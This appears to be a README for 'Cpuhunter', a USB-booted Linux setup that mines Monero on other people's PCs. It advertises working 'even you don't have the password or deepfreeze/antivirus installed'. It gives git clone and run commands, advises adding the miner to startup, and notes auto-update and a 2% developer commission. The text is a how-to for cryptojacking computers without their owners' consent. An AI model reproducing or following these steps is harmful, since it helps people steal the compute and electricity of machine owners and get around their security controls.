# Cpuhunter

![Usb live linux 2 windows monero miner](https://image.ibb.co/gPWncJ/usb_linux_100672302_primary_idge.jpg)

Convert any pc to money machine even you don't have the password or deepfreeze/antivirus installed. 

Let the computers works for you. 

# Requirments

* Monero wallet address (You can get it easily from [Mymonero.com](https://mymonero.com)). 
* Usb drive. 

# Installation 

There are 2 option for installation. 

# 1- Burn img file to usb (easy) (torrent)

Download [Cpuhunter Os img file ](https://yadi.sk/d/dNN415il3Yse5h)nı and burn to a usb drive with [Win32 Disk Imager](https://www.gezginler.net/indir/win32-disk-imager.html) programı ile usb'ye yazdırın. Daha sonrasında bilgisayarınızı hazırlamış olduğunuz usb'den boot edin. 

Than boot your coumputer from usb and write the command below to linux terminal:
```
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

Thats it!

For first use you must type your monero wallet to config.json. After that process will be handled automatically. 


# 2- İnstall to your own bootable linux usb (for professionals)  

İnstall:
```
sudo apt-get install python3 geany
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

Run:
```
python3 /$USER/cpuhunter/exeinstaller.py
```

Put the command above to startup for automatic processiong. 

# Statics Page
https://xmr.nanopool.org/account/[your_monero_wallet_address]

[Sample report](https://xmr.nanopool.org/account/46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S)

Screenshots
==================
 Hashsrate statics:
![](https://image.ibb.co/mSdKWd/hashrateler.png)

 Workers:
![](https://image.ibb.co/h0L54y/ornek_kullanim.png)


# Getting the payments
 Your earnings will be sent to [mymonero.com](https://mymonero.com) wallet when you have 1 Xmr. 
 You can convert to btc or usd when you want. 

# Additonal notes
* Important: Nanopool shows statics after get the successfull hashrate so your workers stats may have some delays to show (about 30 mins)
* Auto update feature is enabled by default. 
* Deveopler comission is 2%.  
* Worker id's are created automatically.  
* You can understand process works successfull when "+" signal is appeared on the top-right corner. 



  
  
